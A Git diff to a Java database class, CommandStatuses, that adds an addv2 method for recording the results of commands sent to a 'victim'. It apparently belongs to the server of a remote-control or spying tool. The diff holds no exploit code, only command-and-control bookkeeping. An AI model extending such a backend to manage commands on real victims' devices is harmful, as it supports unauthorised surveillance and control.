@@ -1,8 +1,12 @@
 package com.theah64.xrob.api.database.tables.command;
 
+import com.sun.istack.internal.Nullable;
 import com.theah64.xrob.api.database.Connection;
 import com.theah64.xrob.api.database.tables.BaseTable;
 import com.theah64.xrob.api.models.Command;
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
 
 import java.sql.PreparedStatement;
 import java.sql.SQLException;
@@ -43,8 +47,6 @@ public class CommandStatuses extends BaseTable<Command.Status> {
             ps.setString(3, status.getStatusMessage());
             ps.setLong(4, status.getCommandHappenedAt());
 
-            System.out.println("Command happened at " + status.getCommandHappenedAt());
-
             isAdded = ps.executeUpdate() == 1;
 
             ps.close();
@@ -59,6 +61,53 @@ public class CommandStatuses extends BaseTable<Command.Status> {
             }
         }
         return isAdded;
+    }
+
+    @Override
+    public void addv2(@Nullable String victimId, JSONArray jaCommandStatuses) throws RuntimeException, JSONException {
+
+        final CommandStatuses cStatuesTable = CommandStatuses.getInstance();
+
+        for (int i = 0; i < jaCommandStatuses.length(); i++) {
+
+            final JSONObject joCommandStatus = jaCommandStatuses.getJSONObject(i);
+
+            final String commandId = joCommandStatus.getString(CommandStatuses.COLUMN_COMMAND_ID);
+
+            //is command exist
+            final boolean isCommandExistAndEstablishedForThisVictim = Commands.getInstance().isExist(Commands.COLUMN_ID, commandId, Commands.COLUMN_VICTIM_ID, victimId);
+
+            if (isCommandExistAndEstablishedForThisVictim) {
+
+                final String status = joCommandStatus.getString(CommandStatuses.COLUMN_STATUS);
+
+                if (Command.Status.isValid(status)) {
+
+                    final boolean isStatusAlreadyExists = cStatuesTable.isExist(CommandStatuses.COLUMN_COMMAND_ID, commandId, CommandStatuses.COLUMN_STATUS, status);
+
+                    final long commandProcessedAt = joCommandStatus.getLong(CommandStatuses.COLUMN_STATUS_HAPPENED_AT);
+
+                    final boolean isStatusAdded = isStatusAlreadyExists || cStatuesTable.add(new Command.Status(
+                            status,
+                            joCommandStatus.getString(CommandStatuses.COLUMN_STATUS_MESSAGE),
+                            0,//now
+                            commandProcessedAt, commandId
+                    ));
+
+                    if (!isStatusAdded) {
+                        throw new IllegalArgumentException("Failed to add command status");
+                    }
+
+                } else {
+                    throw new IllegalArgumentException("Invalid status : " + status);
+                }
+
+
+            } else {
+                throw new IllegalArgumentException("Command doesn't exist or not established for you");
+            }
+        }
+
     }
 
     @Override
